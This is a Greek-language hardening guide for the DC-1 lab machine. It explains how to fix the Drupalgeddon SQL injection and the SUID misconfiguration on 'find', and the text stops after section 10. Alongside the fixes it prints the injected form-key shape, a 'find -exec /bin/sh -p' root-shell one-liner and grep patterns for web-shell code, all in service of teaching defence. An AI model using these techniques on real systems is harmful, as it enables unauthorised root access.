# DC-1 — Εγχειρίδιο Θωράκισης (Hardening & Remediation Guide)

Το [README.md](README.md) έδειξε μια αλυσίδα **δύο κρίκων**: το **Drupalgeddon (CVE-2014-3704)** έδωσε εκτέλεση κώδικα ως `www-data` και το **SUID bit στο `/usr/bin/find`** έδωσε `root`. Αυτό το εγχειρίδιο εξηγεί πώς σπάμε **κάθε** κρίκο ξεχωριστά, ώστε η επίθεση να αποτύχει ακόμη κι αν ένα μέτρο παραλειφθεί.

Η επίθεση στο DC-1 διδάσκει δύο σημαντικά πράγματα:

1. **Η καθυστέρηση στις ενημερώσεις είναι ευπάθεια.** Η διόρθωση για το Drupalgeddon κυκλοφόρησε τον Οκτώβριο του 2014. Ό,τι έκανε το Metasploit στο εργαστήριο, το έκαναν αυτοματοποιημένα bots σε όλο το διαδίκτυο **μέσα σε ώρες** από την ανακοίνωση.
2. **Τα δικαιώματα αρχείων είναι μηχανισμός ασφαλείας.** Ένα μόνο bit (`s`) σε λάθος εκτελέσιμο ακυρώνει τον διαχωρισμό χρηστών του Linux.

> ⚠️ **Πριν ξεκινήσετε:** πάρτε **snapshot** της VM. Μετά τη θωράκιση, επαναφέρετε το snapshot σε δεύτερη VM ή ξανατρέξτε το Metasploit στην ίδια, για να δείτε τη διαφορά.

> ℹ️ Οι εντολές εκτελούνται **στο DC-1 ως `root`**. Για πρόσβαση root χωρίς την επίθεση, μπορείτε να κάνετε επανεκκίνηση και να μπείτε σε single-user mode από το GRUB (`init=/bin/bash`), ή απλώς να χρησιμοποιήσετε το root shell που πήρατε στο εργαστήριο.

---

## Περιεχόμενα

1. [Χάρτης: Επίθεση → Αιτία → Διόρθωση](#1-χάρτης-επίθεση--αιτία--διόρθωση)
2. [Απογραφή του συστήματος](#2-απογραφή-του-συστήματος)
3. [Κατανόηση του Drupalgeddon (για να καταλάβουμε τη διόρθωση)](#3-κατανόηση-του-drupalgeddon)
4. [Αναβάθμιση του Drupal](#4-αναβάθμιση-του-drupal)
5. [Μείωση διαρροής πληροφοριών (fingerprinting)](#5-μείωση-διαρροής-πληροφοριών)
6. [Θωράκιση ρυθμίσεων και αρχείων του Drupal](#6-θωράκιση-ρυθμίσεων-και-αρχείων-του-drupal)
7. [Θωράκιση PHP](#7-θωράκιση-php)
8. [Περιορισμός εξερχόμενων συνδέσεων (αποτροπή reverse shell)](#8-περιορισμός-εξερχόμενων-συνδέσεων)
9. [SUID: κατανόηση, έλεγχος, διόρθωση](#9-suid-κατανόηση-έλεγχος-διόρθωση)
10. [Επιλογές προσάρτησης: `nosuid`, `noexec`, `nodev`](#10-επιλογές-προσάρτησης)
11. [Λειτουργικό σύστημα, υπηρεσίες, firewall, SSH](#11-λειτουργικό-σύστημα-υπηρεσίες-firewall-ssh)
12. [Επαλήθευση](#12-επαλήθευση)
13. [Λίστα ελέγχου & ερωτήσεις αυτοελέγχου](#13-λίστα-ελέγχου--ερωτήσεις-αυτοελέγχου)

---

## 1. Χάρτης: Επίθεση → Αιτία → Διόρθωση

| Φάση (README) | Τι εκμεταλλεύτηκε ο επιτιθέμενος | Ρίζα του προβλήματος | Διόρθωση (ενότητα) |
| :--- | :--- | :--- | :--- |
| 1. `nmap -sV -p-` | Apache, Debian Wheezy, Drupal 7, θύρα 111 | Παρωχημένο OS, περιττές υπηρεσίες, banners | §5, §11 |
| 1. `CHANGELOG.txt` | Ακριβής έκδοση Drupal | Αρχεία τεκμηρίωσης προσβάσιμα από το web | §5 |
| 2. `drupal_drupageddon` | SQL Injection → RCE χωρίς σύνδεση | Drupal < 7.32 | §3, §4 |
| 2. Meterpreter (`reverse_tcp`) | Ο server συνδέθηκε **προς** τον επιτιθέμενο | Καμία πολιτική για εξερχόμενη κίνηση | §8 |
| 3. `pty.spawn` | Διαδραστικό κέλυφος ως `www-data` | Η PHP μπορεί να εκτελεί εντολές συστήματος | §7 |
| 3. `settings.php` | Διαπιστευτήρια βάσης (`flag1` → `settings.php`) | Αρχείο αναγνώσιμο, χρήστης βάσης με πολλά δικαιώματα | §6 |
| 4. `find / -perm -u=s` | `/usr/bin/find` με SUID root | Λάθος δικαιώματα αρχείου | §9, §10 |
| 4. `find . -exec /bin/sh \; -quit` | Root shell | `find` εκτελεί αυθαίρετες εντολές | §9 |

---

## 2. Απογραφή του συστήματος

```bash
cat /etc/debian_version          # → 7.x (Wheezy)
uname -a
ss -tulpn 2>/dev/null || netstat -tulpn    # Το Wheezy μπορεί να μην έχει ss, οπότε χρησιμοποιούμε netstat
```

Εντοπίζουμε την έκδοση του Drupal **από μέσα** (ο επιτιθέμενος τη βρήκε από έξω):

```bash
cd /var/www
grep "define('VERSION'" includes/bootstrap.inc
```

Το Drupal 7 ορίζει την έκδοσή του στη σταθερά `VERSION` μέσα στο `includes/bootstrap.inc`. Αν η τιμή είναι **μικρότερη από 7.32**, το σύστημα είναι ευάλωτο στο Drupalgeddon.

Κάνουμε και μια πρώτη απογραφή των αρχείων SUID, την οποία θα χρησιμοποιήσουμε στην §9:

```bash
find / -xdev -perm -4000 -type f -exec ls -l {} \; 2>/dev/null
```

---

## 3. Κατανόηση του Drupalgeddon

Για να εφαρμόσουμε σωστά μια διόρθωση, πρέπει να καταλαβαίνουμε τι διορθώνει.

Το Drupal 7 έχει ένα **επίπεδο αφαίρεσης βάσης δεδομένων** (database abstraction layer) που χρησιμοποιεί **prepared statements**, δηλαδή ερωτήματα με placeholders. Αυτή είναι συνήθως η σωστή άμυνα κατά του SQL Injection. Όταν όμως η τιμή ενός placeholder είναι **πίνακας** (π.χ. για `IN (...)`), η συνάρτηση `expandArguments()` στο `includes/database/database.inc` δημιουργεί αυτόματα νέα placeholders χρησιμοποιώντας τα **κλειδιά** του πίνακα:

```php
// Ευάλωτος κώδικας (Drupal ≤ 7.31)
foreach ($data as $i => $value) {
    $new_keys[$key . '_' . $i] = $value;
}
```

Η εφαρμογή υπέθετε ότι τα κλειδιά θα είναι αριθμοί (`0, 1, 2…`). Ο επιτιθέμενος όμως στέλνει στη φόρμα σύνδεσης ένα πεδίο όπως `name[0; INSERT INTO users ...;#]`. Η PHP το μετατρέπει σε πίνακα με **κλειδί που είναι κείμενο SQL**, και αυτό το κείμενο καταλήγει **μέσα** στο ερώτημα. Αποτέλεσμα: αυθαίρετη SQL **χωρίς** να χρειάζεται λογαριασμός. Από εκεί, το Metasploit γράφει κώδικα PHP στη βάση (π.χ. μέσω του cache ή του menu router) και τον εκτελεί.

Η **επίσημη διόρθωση** (Drupal 7.32) ήταν μία γραμμή:

```php
// Διορθωμένος κώδικας (Drupal ≥ 7.32)
foreach (array_values($data) as $i => $value) {
    $new_keys[$key . '_' . $i] = $value;
}
```

Η `array_values()` αγνοεί τα κλειδιά που έστειλε ο χρήστης και τα αντικαθιστά με `0, 1, 2…`. **Μάθημα:** τα δεδομένα του χρήστη δεν είναι ασφαλή μόνο επειδή περνούν από prepared statement. **Κάθε** μέρος της εισόδου (και τα κλειδιά, όχι μόνο οι τιμές) πρέπει να θεωρείται μη έμπιστο.

---

## 4. Αναβάθμιση του Drupal

### 4.1 Έκτακτη διόρθωση (hotfix) όταν η αναβάθμιση δεν είναι άμεσα δυνατή

Σε πραγματικά συστήματα, μια πλήρης αναβάθμιση μπορεί να θέλει δοκιμές. Αν η ευπάθεια εκμεταλλεύεται **ενεργά**, εφαρμόζουμε **πρώτα** τη διόρθωση της μίας γραμμής:

```bash
cd /var/www
cp includes/database/database.inc /root/database.inc.bak

# Εντοπίζουμε τη γραμμή
grep -n 'foreach ($data as $i => $value)' includes/database/database.inc

# Εφαρμογή της διόρθωσης
sed -i 's/foreach (\$data as \$i => \$value)/foreach (array_values($data) as $i => $value)/' includes/database/database.inc

# Επιβεβαίωση
grep -n 'array_values($data)' includes/database/database.inc
```

> ⚠️ Το hotfix είναι **προσωρινό** μέτρο. Η έκδοση 7.31 έχει πολλές ακόμη ευπάθειες (π.χ. Drupalgeddon 2, CVE-2018-7600) που αυτή η γραμμή δεν διορθώνει.

### 4.2 Αναβάθμιση στην τελευταία έκδοση του Drupal 7

```bash
# 1. Αντίγραφα ασφαλείας: αρχεία ΚΑΙ βάση
tar czf /root/drupal-files-$(date +%F).tgz /var/www
mysqldump -u root -p drupaldb > /root/drupal-db-$(date +%F).sql

# 2. Λειτουργία συντήρησης: οι επισκέπτες βλέπουν μήνυμα, όχι μισοαναβαθμισμένο site
drush -r /var/www vset maintenance_mode 1

# 3. Αναβάθμιση πυρήνα και modules
drush -r /var/www pm-update

# 4. Εκτέλεση των ενημερώσεων βάσης που μπορεί να απαιτεί η νέα έκδοση
drush -r /var/www updatedb

# 5. Επαναφορά λειτουργίας
drush -r /var/www vset maintenance_mode 0
drush -r /var/www cc all
```

* **`drush`** είναι το εργαλείο γραμμής εντολών του Drupal (στο Wheezy: `apt-get install drush`).
* Το όνομα της βάσης (`drupaldb`) το βρίσκετε στο `sites/default/settings.php`.
* `-r /var/www`: η ριζική διαδρομή της εγκατάστασης Drupal.
* `cc all`: καθαρίζει όλες τις μνήμες cache. Το Drupalgeddon συχνά αφήνει κακόβουλο κώδικα **μέσα στο cache**, οπότε ο καθαρισμός είναι και μέτρο καθαρισμού μετά από παραβίαση.

Αν το `drush` δεν έχει πρόσβαση στο διαδίκτυο, η χειροκίνητη αναβάθμιση γίνεται έτσι: κατεβάζετε το νέο tarball από το drupal.org, αντικαθιστάτε **όλα** τα αρχεία **εκτός** από τον φάκελο `sites/` και το `.htaccess` (αν το έχετε τροποποιήσει), και ανοίγετε το `/update.php`.

### 4.3 Η πραγματική λύση: μετάβαση από το Drupal 7

Το **Drupal 7 έφτασε στο τέλος ζωής του τον Ιανουάριο του 2025**. Δεν βγαίνουν πλέον επίσημες ενημερώσεις ασφαλείας. Η μακροπρόθεσμη λύση είναι μετάβαση στο **Drupal 10/11** (εργαλεία `migrate_upgrade`) ή σε άλλη υποστηριζόμενη πλατφόρμα. Μέχρι τότε, εμπορικές υπηρεσίες «Extended Support» παρέχουν ενημερώσεις επί πληρωμή.

### 4.4 Έλεγχος για ενδείξεις προηγούμενης παραβίασης

Αν το site ήταν εκτεθειμένο με ευάλωτη έκδοση, **υποθέτουμε ότι έχει ήδη παραβιαστεί**. Η αναβάθμιση κλείνει την πόρτα, αλλά δεν βγάζει όποιον έχει ήδη μπει.

```bash
# Χρήστες διαχειριστή που δεν αναγνωρίζουμε
drush -r /var/www sqlq "SELECT u.uid, u.name, u.mail, FROM_UNIXTIME(u.created) FROM users u JOIN users_roles r ON u.uid=r.uid;"

# Αρχεία PHP που τροποποιήθηκαν πρόσφατα
find /var/www -name '*.php' -mtime -30 -ls

# Ύποπτα αρχεία PHP σε φακέλους που δεν θα έπρεπε να έχουν
find /var/www/sites/default/files -name '*.php'

# Ύποπτες συναρτήσεις σε αρχεία PHP
grep -rlE 'eval\(base64_decode|assert\(\$_|system\(\$_' /var/www
```

Αν βρεθούν ευρήματα, το ασφαλέστερο είναι **επανεγκατάσταση από καθαρή πηγή** και επαναφορά μόνο των δεδομένων.

---

## 5. Μείωση διαρροής πληροφοριών

Ο επιτιθέμενος διάβασε το `/CHANGELOG.txt` και βρήκε την ακριβή έκδοση. Το Drupal 7 έχει αρκετά τέτοια αρχεία στη ρίζα του.

```bash
cd /var/www
ls *.txt
# CHANGELOG.txt COPYRIGHT.txt INSTALL.mysql.txt INSTALL.pgsql.txt INSTALL.sqlite.txt
# INSTALL.txt LICENSE.txt MAINTAINERS.txt README.txt UPGRADE.txt
```

**Επιλογή Α — διαγραφή** (απλή, αλλά επανεμφανίζονται σε κάθε αναβάθμιση):

```bash
rm -f CHANGELOG.txt INSTALL*.txt MAINTAINERS.txt UPGRADE.txt README.txt
```

**Επιλογή Β — απαγόρευση από τον Apache** (μόνιμη):

```apache
# /etc/apache2/conf.d/drupal-hardening   (Apache 2.2 στο Wheezy)
<Directory /var/www>
    <FilesMatch "^(CHANGELOG|COPYRIGHT|INSTALL.*|LICENSE|MAINTAINERS|README|UPGRADE)\.txt$">
        Order allow,deny
        Deny from all
    </FilesMatch>
    <FilesMatch "^(install|update|cron|authorize|xmlrpc)\.php$">
        Order allow,deny
        Deny from all
        Allow from 127.0.0.1 192.168.56.0/24
    </FilesMatch>
    Options -Indexes
</Directory>
```

* Το Wheezy έχει **Apache 2.2**, που χρησιμοποιεί `Order/Deny/Allow`. Στον Apache 2.4 το ίδιο γράφεται `Require all denied` / `Require ip ...`.
* Τα `install.php`, `update.php`, `cron.php` χρειάζονται μόνο στον διαχειριστή, οπότε επιτρέπονται μόνο από το δίκτυο διαχείρισης.

Απόκρυψη banners Apache και PHP:

```apache
# /etc/apache2/conf.d/security
ServerTokens Prod
ServerSignature Off
TraceEnable Off
```

```bash
sed -i 's/^expose_php = On/expose_php = Off/' /etc/php5/apache2/php.ini
apache2ctl configtest && service apache2 reload
```

Επιπλέον, το Drupal 7 στέλνει το header `X-Generator: Drupal 7` και την ετικέτα `<meta name="Generator">`. Αφαιρούνται με το module `remove_generator` ή με `Header unset X-Generator` (απαιτεί `a2enmod headers`).

---

## 6. Θωράκιση ρυθμίσεων και αρχείων του Drupal

### 6.1 Το `settings.php`

Το `flag1.txt` υπέδειξε το `sites/default/settings.php`, που περιέχει τα διαπιστευτήρια της βάσης. Ο `www-data` πρέπει να μπορεί να το **διαβάζει**, αλλά **κανείς** δεν πρέπει να μπορεί να το γράψει μέσω του web server.

```bash
cd /var/www/sites/default
ls -l settings.php

chown root:www-data settings.php
chmod 440 settings.php           # r--r----- : ανάγνωση από root και www-data, καμία εγγραφή
chmod 555 .                       # Ο φάκελος sites/default δεν δέχεται νέα αρχεία
```

Γιατί `440` και όχι `640`; Επειδή το Drupal ελέγχει στη σελίδα *Status report* αν το `settings.php` είναι **εγγράψιμο** και προειδοποιεί. Ούτε ο root χρειάζεται εγγραφή σε κανονική λειτουργία· όταν χρειαστεί αλλαγή, κάνει προσωρινά `chmod 640`.

### 6.2 Χρήστης βάσης με ελάχιστα δικαιώματα

```sql
-- Ποια δικαιώματα έχει σήμερα ο χρήστης του Drupal;
SHOW GRANTS FOR 'dbuser'@'localhost';
```

Αν βλέπετε `ALL PRIVILEGES ON *.*` ή `FILE`, ο χρήστης έχει πολύ περισσότερα από όσα χρειάζεται:

```sql
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'dbuser'@'localhost';
GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER,
      CREATE TEMPORARY TABLES, LOCK TABLES
  ON drupaldb.* TO 'dbuser'@'localhost';
SET PASSWORD FOR 'dbuser'@'localhost' = PASSWORD('Νέος-Ισχυρός-Κωδικός-2026!');
FLUSH PRIVILEGES;
```

Αυτή είναι η επίσημη λίστα δικαιωμάτων που απαιτεί το Drupal 7 (`INSTALL.mysql.txt`). Ενημερώνετε το `settings.php` με τον νέο κωδικό. Ο **παλιός** κωδικός θεωρείται εκτεθειμένος, γιατί ο επιτιθέμενος τον διάβασε.

### 6.3 Ιδιοκτησία αρχείων: ο web server διαβάζει, δεν γράφει

```bash
cd /var/www
chown -R root:www-data .
find . -type d -exec chmod 750 {} \;
find . -type f -exec chmod 640 {} \;

# Εξαίρεση: ο φάκελος των ανεβασμένων αρχείων χρειάζεται εγγραφή
chown -R www-data:www-data sites/default/files
find sites/default/files -type d -exec chmod 770 {} \;
find sites/default/files -type f -exec chmod 660 {} \;
```

**Γιατί είναι σημαντικό:** αν ένα exploit πάρει εκτέλεση κώδικα ως `www-data`, το πρώτο που προσπαθεί είναι να γράψει ένα **μόνιμο backdoor** (π.χ. `shell.php`) σε κάποιον φάκελο του site. Με αυτά τα δικαιώματα ο `www-data` μπορεί να γράψει **μόνο** στο `files/`, και εκεί…

### 6.4 …απαγορεύουμε την εκτέλεση PHP στο `files/`

Το Drupal 7 δημιουργεί αυτόματα το `sites/default/files/.htaccess`. Επιβεβαιώνουμε ότι υπάρχει και περιέχει:

```apache
SetHandler Drupal_Security_Do_Not_Remove_See_SA_2006_006
Options None
Options +FollowSymLinks
<IfModule mod_php5.c>
  php_flag engine off
</IfModule>
```

* `php_flag engine off`: ακόμη κι αν ανέβει αρχείο `.php`, ο Apache δεν θα το εκτελέσει.
* Το `.htaccess` λειτουργεί μόνο αν ο Apache έχει `AllowOverride All` για τον φάκελο. Ελέγξτε το στο `/etc/apache2/sites-enabled/000-default`.

### 6.5 Απενεργοποίηση επικίνδυνων modules

Το module **PHP filter** επιτρέπει σε όποιον έχει το σχετικό δικαίωμα να γράφει κώδικα PHP μέσα σε περιεχόμενο. Αν ένας επιτιθέμενος αποκτήσει λογαριασμό διαχειριστή (π.χ. μέσω της SQLi), μπορεί να το χρησιμοποιήσει για εκτέλεση κώδικα.

```bash
drush -r /var/www pm-list --status=enabled --type=module | grep -i php
drush -r /var/www pm-disable php -y
```

Γενικός κανόνας: **ό,τι module δεν χρησιμοποιείται, απενεργοποιείται και αφαιρείται.**

### 6.6 Αλλαγή κωδικών χρηστών Drupal

Η SQLi του Drupalgeddon επιτρέπει ανάγνωση **και** αλλαγή του πίνακα `users`. Μετά την αναβάθμιση αλλάζουμε όλους τους κωδικούς διαχειριστών:

```bash
drush -r /var/www user-password admin --password="Νέος-Ισχυρός-Κωδικός"
```

---

## 7. Θωράκιση PHP

Μετά το Drupalgeddon, ο επιτιθέμενος είχε εκτέλεση **κώδικα PHP**. Για να γίνει αυτό **κέλυφος** (`shell`, `python -c 'import pty...'`), η PHP έπρεπε να μπορεί να καλεί εντολές του λειτουργικού. Μπορούμε να το περιορίσουμε.

Στο `/etc/php5/apache2/php.ini`:

```ini
; Συναρτήσεις που εκτελούν εντολές συστήματος. Το Drupal core δεν τις χρειάζεται.
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec,show_source

; Η PHP διαβάζει/γράφει αρχεία ΜΟΝΟ μέσα σε αυτές τις διαδρομές
open_basedir = /var/www:/tmp

; Απαγόρευση φόρτωσης κώδικα από URL (αποτρέπει Remote File Inclusion)
allow_url_include = Off
allow_url_fopen   = Off

expose_php      = Off
display_errors  = Off     ; Τα σφάλματα αποκαλύπτουν διαδρομές και δομή βάσης
log_errors      = On

; Cookies συνεδρίας
session.cookie_httponly = 1
session.use_only_cookies = 1
```

Επεξήγηση:

| Ρύθμιση | Τι αποτρέπει στο σενάριο DC-1 |
| :--- | :--- |
| `disable_functions` | Το `shell` του Meterpreter και κάθε `system("...")` αποτυγχάνουν |
| `open_basedir` | Η PHP δεν διαβάζει `/etc/passwd`, `/home/*`, `/root` |
| `allow_url_fopen = Off` | Η PHP δεν κατεβάζει εργαλεία (π.χ. LinEnum) από τον επιτιθέμενο |
| `display_errors = Off` | Τα σφάλματα SQL δεν εμφανίζονται στον browser |

```bash
service apache2 restart
php -i | grep -E 'disable_functions|open_basedir'   # Προσοχή: το CLI έχει ξεχωριστό php.ini
```

> ⚠️ **Δοκιμάστε το site μετά.** Ορισμένα contrib modules (π.χ. για εικόνες ή PDF) μπορεί να χρειάζονται κάποια από αυτές τις συναρτήσεις. Το `allow_url_fopen = Off` μπορεί να επηρεάσει τον έλεγχο ενημερώσεων του Drupal (module *Update manager*). Αφαιρείτε από τη λίστα **μόνο** ό,τι αποδεδειγμένα χρειάζεται.

> 💡 Το `disable_functions` **δεν** είναι αδιαπέραστο, γιατί έχουν δημοσιευτεί τεχνικές παράκαμψης. Είναι ένα **επιπλέον** εμπόδιο που αναγκάζει τον επιτιθέμενο σε πιο σύνθετες τεχνικές, όχι υποκατάστατο της αναβάθμισης.

---

## 8. Περιορισμός εξερχόμενων συνδέσεων

### 8.1 Γιατί είναι αποτελεσματικό

Το Metasploit χρησιμοποίησε payload **`reverse_tcp`**: ο **server** άνοιξε σύνδεση **προς** τον επιτιθέμενο. Τα περισσότερα firewalls ελέγχουν μόνο τα **εισερχόμενα**, οπότε η σύνδεση πέρασε.

Ένας web server όμως **δεν έχει λόγο** να ξεκινά νέες συνδέσεις προς τυχαίους υπολογιστές. Απαντά σε συνδέσεις που έρχονται σε αυτόν. Αυτό λέγεται **egress filtering** (φιλτράρισμα εξόδου).

### 8.2 Κανόνες iptables ανά χρήστη

Το module `owner` του iptables επιτρέπει κανόνες με βάση τον **χρήστη** που δημιούργησε το πακέτο:

```bash
# Ο www-data μπορεί να μιλήσει στη βάση τοπικά (loopback)
iptables -A OUTPUT -o lo -j ACCEPT

# Απαντήσεις σε ήδη υπάρχουσες συνδέσεις (π.χ. απάντηση σε επισκέπτη) επιτρέπονται
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Ο www-data χρειάζεται DNS μόνο αν το site επικοινωνεί με εξωτερικές υπηρεσίες
# iptables -A OUTPUT -m owner --uid-owner www-data -p udp --dport 53 -j ACCEPT

# Κάθε ΝΕΑ σύνδεση που ξεκινά από τον www-data απορρίπτεται και καταγράφεται
iptables -A OUTPUT -m owner --uid-owner www-data -m state --state NEW -j LOG --log-prefix "WWW-EGRESS: "
iptables -A OUTPUT -m owner --uid-owner www-data -m state --state NEW -j REJECT
```

* `-A OUTPUT`: προσθήκη κανόνα στην αλυσίδα των **εξερχόμενων** πακέτων.
* `--uid-owner www-data`: ισχύει μόνο για πακέτα που δημιούργησαν διεργασίες του `www-data` (Apache/PHP).
* `--state NEW`: μόνο για **νέες** συνδέσεις. Οι απαντήσεις προς τους επισκέπτες είναι `ESTABLISHED` και περνούν από τον προηγούμενο κανόνα.
* `LOG`: γράφει στο `/var/log/kern.log`. Κάθε τέτοια εγγραφή είναι **ισχυρή ένδειξη** παραβίασης.

Αποθήκευση ώστε οι κανόνες να ισχύουν μετά από επανεκκίνηση:

```bash
apt-get install iptables-persistent
iptables-save > /etc/iptables/rules.v4
```

**Αποτέλεσμα:** ακόμη κι αν το Drupalgeddon εκτελεστεί επιτυχώς, το `reverse_tcp` δεν μπορεί να συνδεθεί πίσω. Ο επιτιθέμενος θα έπρεπε να χρησιμοποιήσει πιο σύνθετες τεχνικές (π.χ. web shell μέσω HTTP), τις οποίες δυσκολεύουν τα μέτρα των §6.3 και §7.

---

## 9. SUID: κατανόηση, έλεγχος, διόρθωση

### 9.1 Τι είναι το SUID

Κανονικά, ένα πρόγραμμα εκτελείται με τα δικαιώματα του **χρήστη που το τρέχει**. Με το **SUID bit** (Set User ID), εκτελείται με τα δικαιώματα του **ιδιοκτήτη του αρχείου**.

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root ... /usr/bin/passwd
#     ↑ το 's' στη θέση του 'x' του ιδιοκτήτη = SUID
```

Το `passwd` **χρειάζεται** SUID: ένας απλός χρήστης πρέπει να μπορεί να αλλάξει τον κωδικό του, που βρίσκεται στο `/etc/shadow` (αναγνώσιμο/εγγράψιμο μόνο από τον root). Το `passwd` είναι σχεδιασμένο ώστε να κάνει **μόνο** αυτό.

Το **`find`** όμως έχει την επιλογή `-exec`, που εκτελεί **οποιαδήποτε** εντολή. Με SUID root, «οποιαδήποτε εντολή» σημαίνει «οποιαδήποτε εντολή ως root»:

```bash
find . -exec /bin/sh -p \; -quit
```

Η τεχνική ισχύει για κάθε πρόγραμμα που μπορεί να εκτελέσει άλλα προγράμματα, να διαβάσει/γράψει αυθαίρετα αρχεία ή να ανοίξει shell (βλ. GTFOBins).

### 9.2 Έλεγχος: απογραφή όλων των SUID/SGID

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f -exec ls -ld {} \; 2>/dev/null
```

* `-perm -4000`: SUID. `-perm -2000`: **SGID** (το ίδιο για την ομάδα).
* `-xdev`: δεν περνά σε άλλα filesystems (π.χ. `/proc`, mounts δικτύου).
* `-o`: λογικό «ή».

Συγκρίνετε κάθε αποτέλεσμα με τη λίστα **αναμενόμενων** SUID σε Debian:

| Αναμενόμενο SUID | Γιατί το χρειάζεται |
| :--- | :--- |
| `/usr/bin/passwd`, `chsh`, `chfn`, `gpasswd`, `newgrp` | Αλλαγή στοιχείων λογαριασμού στο `/etc/shadow` / `/etc/passwd` |
| `/bin/su`, `/usr/bin/sudo` | Αλλαγή χρήστη |
| `/bin/mount`, `/bin/umount` | Προσάρτηση από χρήστες (σε ρυθμισμένες περιπτώσεις) |
| `/bin/ping` | Raw sockets (στα νεότερα συστήματα αντικαθίσταται από capabilities) |
| `/usr/lib/openssh/ssh-keysign`, `/usr/lib/eject/dmcrypt-get-device` | Ειδικές βοηθητικές λειτουργίες |

**Δεν πρέπει ποτέ** να έχουν SUID: `find`, `vim`, `nano`, `less`, `more`, `cp`, `mv`, `bash`, `python`, `perl`, `nmap`, `tar`, `awk`, `env`.

Επιβεβαιώνουμε αν το SUID του `find` είναι **από το πακέτο** ή προστέθηκε χειροκίνητα:

```bash
dpkg -S /usr/bin/find               # → findutils
dpkg-statoverride --list            # Ρητές παρακάμψεις δικαιωμάτων
debsums -c findutils 2>/dev/null    # Αλλαγμένα αρχεία του πακέτου (apt-get install debsums)
```

### 9.3 Διόρθωση

```bash
chmod u-s /usr/bin/find
ls -l /usr/bin/find        # → -rwxr-xr-x  (το 's' έγινε 'x')
```

Υπάρχει όμως μια λεπτομέρεια: **στην επόμενη αναβάθμιση του πακέτου `findutils`**, το `dpkg` θα ξαναγράψει το αρχείο με τα δικαιώματα του πακέτου. Αν κάποιος έχει τροποποιήσει το πακέτο ή αν τα δικαιώματα ορίζονται από λανθασμένη παράκαμψη, το SUID μπορεί να επανέλθει. Για να **κλειδώσουμε** τα σωστά δικαιώματα:

```bash
# Αν υπάρχει λανθασμένη παράκαμψη, την αφαιρούμε
dpkg-statoverride --remove /usr/bin/find 2>/dev/null

# Ορίζουμε ρητά: owner root, group root, mode 0755, χωρίς SUID
dpkg-statoverride --update --add root root 0755 /usr/bin/find
```

Το `dpkg-statoverride` αποθηκεύει τα επιθυμητά δικαιώματα και το `dpkg` τα εφαρμόζει σε **κάθε** μελλοντική εγκατάσταση/αναβάθμιση του αρχείου.

### 9.4 Εναλλακτική του SUID: capabilities

Ο πυρήνας Linux χωρίζει τα προνόμια του root σε περίπου 40 **capabilities** (δυνατότητες). Αν ένα πρόγραμμα χρειάζεται μόνο **ένα** προνόμιο, του δίνουμε μόνο αυτό αντί για πλήρες root μέσω SUID:

```bash
# Παράδειγμα: το ping χρειάζεται μόνο raw sockets
chmod u-s /bin/ping
setcap cap_net_raw+ep /bin/ping
getcap /bin/ping            # → /bin/ping = cap_net_raw+ep
```

Αν ένας επιτιθέμενος καταχραστεί το `ping`, παίρνει μόνο τη δυνατότητα να στέλνει raw πακέτα, όχι root shell.

### 9.5 Περιοδικός έλεγχος με γραμμή βάσης (baseline)

Αφού καθαρίσουμε τη λίστα, την αποθηκεύουμε ως **γραμμή βάσης** και ελέγχουμε καθημερινά αν άλλαξε κάτι:

```bash
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | sort > /root/suid-baseline.txt
chmod 600 /root/suid-baseline.txt
```

Script ελέγχου `/usr/local/sbin/suid-check.sh`:

```bash
#!/bin/sh
# Συγκρίνει τα τρέχοντα SUID/SGID αρχεία με τη γραμμή βάσης
CURRENT=$(mktemp)
find / -xdev \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null | sort > "$CURRENT"
if ! diff -u /root/suid-baseline.txt "$CURRENT" > /root/suid-diff.txt; then
    logger -p auth.warning "SUID/SGID αλλαγή: $(grep '^+/' /root/suid-diff.txt | tr '\n' ' ')"
fi
rm -f "$CURRENT"
```

```bash
chmod 700 /usr/local/sbin/suid-check.sh
echo '30 3 * * * root /usr/local/sbin/suid-check.sh' > /etc/cron.d/suid-check
```

* `diff -u`: δείχνει τις διαφορές. Οι γραμμές που ξεκινούν με `+` είναι **νέα** SUID αρχεία.
* `logger`: γράφει μήνυμα στο syslog (`/var/log/auth.log`), ώστε ο διαχειριστής να το δει.
* Το cron τρέχει κάθε μέρα στις 03:30.

Στο σενάριο του Raven 2, όπου ο επιτιθέμενος **πρόσθεσε** SUID στο `find` μέσω MySQL, αυτός ο έλεγχος θα το είχε εντοπίσει την επόμενη μέρα.

---

## 10. Επιλογές προσάρτησης

Οι φάκελοι όπου **κάθε χρήστης** μπορεί να γράψει (`/tmp`, `/var/tmp`, `/dev/shm`) είναι το πρώτο μέρος όπου ένας επιτιθέμενος αποθηκεύει εργαλεία. Μπορούμε να τους προσαρτήσουμε με περιοριστικές επιλογές:

| Επιλογή | Τι κάνει |
| :--- | :--- |
| `nosuid` | Ο πυρήνας **αγνοεί** το SUID/SGID bit σε αρχεία αυτού του filesystem |
| `noexec` | Απαγορεύει την άμεση εκτέλεση προγραμμάτων από αυτό το filesystem |
| `nodev` | Αγνοεί αρχεία συσκευών (αποτρέπει δημιουργία ψεύτικων `/dev/sda`) |

Στο `/etc/fstab`:

```text
tmpfs  /tmp      tmpfs  defaults,nosuid,nodev,noexec,size=512M  0 0
tmpfs  /dev/shm  tmpfs  defaults,nosuid,nodev,noexec            0 0
/tmp   /var/tmp  none   bind                                     0 0
```

Αν το `/home` είναι ξεχωριστό partition, προσθέτουμε `nosuid,nodev` και εκεί.

```bash
mount -o remount /tmp
mount -o remount /dev/shm
mount | grep -E ' /tmp | /dev/shm '      # Επιβεβαίωση των επιλογών
```

* Το `/var/tmp` γίνεται **bind mount** του `/tmp`, ώστε να κληρονομεί τις ίδιες επιλογές.

> ⚠️ Το `noexec` στο `/tmp` μπορεί να επηρεάσει το `apt` (ορισμένα scripts πακέτων εκτελούνται από το `/tmp`). Αν συμβεί, ορίστε στο `/etc/apt/apt.conf.d/50tmp`: `APT::ExtractTemplates::TempDir "/var/cache/apt/tmp";` ή κάντε προσωρινά `mount -o remount,exec /tmp` κατά την αναβάθμιση.

